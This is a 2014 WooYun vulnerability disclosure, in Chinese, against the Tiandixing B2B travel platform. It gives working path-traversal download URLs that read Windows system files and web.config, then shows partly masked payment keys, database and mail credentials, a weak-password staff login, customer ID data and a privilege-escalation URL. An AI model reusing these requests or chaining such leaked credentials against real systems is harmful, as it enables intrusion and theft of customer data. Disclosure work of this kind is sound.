{"id": 42882, "wybug_id": "wooyun-2014-084437", "wybug_title": "天地行漏洞小礼包(任意文件下载引发的连锁反应)", "wybug_corp": "天地行", "wybug_author": "鸟云厂商", "wybug_date": "2014-11-24 11:30", "wybug_open_date": "2015-01-08 11:32", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "任意文件读取", "任意文件遍历下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-08：\t细节向公众公开  简要描述： 天地行某系统任意文件下载 详细说明：  天地行B2B平台任意文件读取下载（提供俩测试链接，证明漏洞存在）http://b2b.tdxinfo.com/Buyer/SystemManage/DownLoad.aspx?filename=C:/Windows/System32/drivers/etc/hostshttp://b2b.tdxinfo.com/Buyer/SystemManage/DownLoad.aspx?filename=c:\\Windows\\win.ini然后http://b2b.tdxinfo.com/Buyer/Notice.aspx?id=140a&fid=NCG50000 id=140后面加个a，报错了。得到路径，于是下载c:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Temporary%20ASP.NET%20Files\\root\\01252a5c\\74b74a9d\\App_Web_rv4mzigr.4.cs打开文件：\n/ </auto-generated>//------------------------------------------------------------------------------namespace ASP {        #line 284 \"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Config\\web.config\"    using System.Web.Security;        #line default    #line hidden        #line 281 \"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Config\\web.config\"    using System.Web;        #line default    #line hidden        #line 283 \"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Config\\web.config\"    using System.Web.SessionState;        #line default    #line hidden        #line 2 \"E:\\supper_oa1\\crm\\buyer\\systemmanage\\ComplaintAdd.aspx\"    using CRM.Web.AppCode;        #line default    #line hidden        #line 279 \"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Config\\web.config\"    using System.Text;\n这回web路径也有了（之前C盘试了半天，没想到在E盘）再下载http://b2b.tdxinfo.com/Buyer/SystemManage/DownLoad.aspx?filename=E:\\supper_oa1\\crm\\web.config\n<add key=\"InsueConfig_TP_MER_ID\" value =\"8*********6\"/>    <add key=\"InsueConfig_TP_USR_ID\" value =\"sh*********2\"/>    <add key=\"InsueConfig_TP_USR_IDSW\" value =\"shb*********14\"/>    <add key=\"InsueConfig_TP_KEY\" value =\"A*********eca\"/>    <add key=\"InsueConfig_TP_BASE_ADDR\" value =\"http://*********com\"/>    <add key=\"InsueConfig_TP_SVR_ADDR\" value =\"/ga*********do\"/>    <add key=\"InsueConfig_TP_TRAN_PWD\" value =\"5*********ha\"/>    <add key=\"InsueConfig_TPY_URL\" value =\"http://*********am\"/>      <add key=\"InsueConfig_CALLBACK_URL\" value =\"http://*********/byc-insurance/insure/chinapnrNotify.shtml\"/>    <add key=\"JD_PAY_URL\" value=\"/front/a*********der.ashx\" />    <add key=\"JD_PAYRESULT_URL\" value=\"/fr*********ult.aspx\" />    <add key=\"InsuranceHeaderUrl\" value=\"http://2*********3/byc-oth/insure.shtml\"/>    <add key=\"InsuranceTKKey\" value=\"B*********6\"/>    <add key=\"InsueConfig_TP_MER_IDTK\" value =\"872170\"/>    <add key=\"InsueConfig_TP_USR_IDSW\" value =\"s*********4\"/>    <add key=\"InsueConfig_TP_USR_IDSW\" value =\"s*********14\"/>\n\n<add key=\"AliPay_URL\" value=\"http:/**********tml\" />    <add key=\"ChinaPNR_URL\" value**********shtml\" />    <add key=\"TenPay_Url\" value=\"http://203**********y.shtml\" />    <add key=\"TenPay_RefundUrl\" value=\"http://19**********?action=refund\" />    <add key=\"Alipay_Notity_Url\" value=\"htt**********spx\" />    <add key=\"Alipay_Return_Url\" value=\"http://**********Alipay_Return.aspx\" />    <add key=\"Tenpay_Notity_Url\" value=\"http://********************spx\" />    <add key=\"Tenpay_Return_Url\" value=\"http:**********ay/Tenpay_Return.aspx\" />    <add key=\"ChinaPNR_Notity_Url\" value=\"http:/**********PNR/ChinaPNR_Notify.aspx\" />    <add key=\"ChinaPNR_Return_Url\" value=\"http://**********_Return.aspx\" />    <add key=\"ChinaPNR_Refund_Notify_Url\" value=\"http://**********Refund_Notify.aspx\" />    <add key=\"ChinaPartner\" value=\"870206\" /> <add key=\"ConnectionString\" value=\"server=19*******5;database=A*******1;uid=b*******b;pwd=*******;Max pool size=512\" />    <!--保险登录账号-->    <add key=\"InsuranceUserLoginName\" value=\"#UserLoginName#\" />    <add key=\"InsurancePswd\" value=\"#Pswd#\" />    <!--java保险测试接口地址-->    <!--<add key=\"InsuranceUrl\" value=\"http:/*******pic.shtml\"/>    <add key=\"InsuranceTPUrl\" value=\"http:*******b.shtml\"/>-->    <!--java保险测试正式地址-->    <add key=\"InsuranceUrl\" value=\"htt*******tml\" />\n接下来利用这段数据进入邮件系统\n<add key=\"is_enable_sqlvalid\" value=\"true\"/>\t  <add key=\"MailFrom\" value =\" m**********m\"/>\t  <add key=\"MailSmtp\" value =\"2**********1\"/>\t  <add key=\"MailHost\" value =\"mail**********om\"/>\t  <add key=\"MailUser\" value =\"m**********r\"/>\t  <add key=\"MailPass\" value =\"A**********5\"/>\n\n\n以及http://mail.10106266.com/admin/\n\n#2 登录状态下http://jdht.tdxinfo.com/可以查酒店订单诶内谁，你又去开房\n\n上图我们看到了，最后一栏写了后台操作员是谁。于是退出当前用户，使用账号jd8389（总部员工），居然是弱口令123456登录B2B酒店后台管理系统订单信息\n\n客户保险、身份证信息\n\n随便给公司发个传真单什么的\n\n这个系统存在越权，用自己注册的账户打开http://ylht.tdxinfo.com/basedata/Template.aspx也可以操作   漏洞证明：     修复方案：     版权声明：转载请注明来源 鸟云厂商@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-11-24 12:18 厂商回复： 感谢您给我们业务系统安全做出的贡献. 由于这是已经废弃不用的老系统（已经关闭），因此危害级别较低，因此给出低级别的RANK，希望可以谅解。我们欢迎和鼓励白帽子在不影响系统、破坏系统以及窃取数据的前提下，对我们真旅网旗下各个平台做安全检测，提供技术细节以及解决方案、预防方案。我们将根据漏洞等级/严重程度给予报告漏洞的白帽子发放相应的Rank及礼物。天地行：www_tdxinfo_com  (主平台)运营商：op_tdxinfo_com供应商：provider_tdxinfo_comB2G： vipcorp_travelzen_com 最新状态： 2014-11-24：请大家对我们列表的站点进行检测，列表外的特别是废弃不用的系统，我们将不再给予礼物发放哦，谢谢谅解！  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}